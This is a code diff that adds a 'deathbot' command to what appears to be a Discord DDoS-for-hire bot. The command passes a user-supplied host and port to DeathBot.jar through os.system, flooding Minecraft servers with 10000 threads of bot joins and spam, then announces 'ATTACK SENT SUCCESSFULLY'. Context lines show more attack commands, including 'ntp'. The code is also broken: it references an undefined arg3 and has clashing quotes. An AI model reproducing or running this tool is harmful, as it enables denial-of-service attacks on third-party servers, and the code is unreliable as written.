@@ -699,6 +699,32 @@ async def joinmotd(ctx, arg1, arg2):
 
 @client.command()
 
+async def deathbot(ctx, arg1, arg2):
+    if arg1 == '1.1.1.1':
+        await ctx.send('You cant attack 1.1.1.1')
+        pass
+    else:
+        def attack():
+            os.system(f'java -jar DeathBot.jar -move true -ping true -pingamount 10 -host {arg1} -port {arg2} -threads 10000 -nicksize 16 -stay true -stayl 2000 -nicks RANDOM -spam true -ach true -joinamount 10 -doublej true -protocol 47 -msg 'Attack By SlayyGang' -amount 10 -proxymode NONE -login '/login rodiontest123 ' -register '/register rodiontest123 rodiontest123 ' -time {arg3} -debug true')
+            os.system(f"")
+
+        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
+
+        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
+        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``bypasshub``', value='**[𝗧𝗜𝗠𝗘]**: ``60 sec``', inline=False)
+        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Dibbo``' , inline=False)
+        embed.set_thumbnail(
+        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
+    
+        embed.set_footer(text="𝗗𝗶𝗯𝗯𝗼'𝘀 𝗟𝗮𝗶𝗿 | 𝗗𝗶𝗯𝗯𝗼")
+        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
+        t1 = threading.Thread(target=attack)
+
+        t1.start()
+        await ctx.send(embed=embed)
+
+@client.command()
+
 async def ntp(ctx, arg1):
     if arg1 == '1.1.1.1':
         await ctx.send('You cant attack 1.1.1.1')
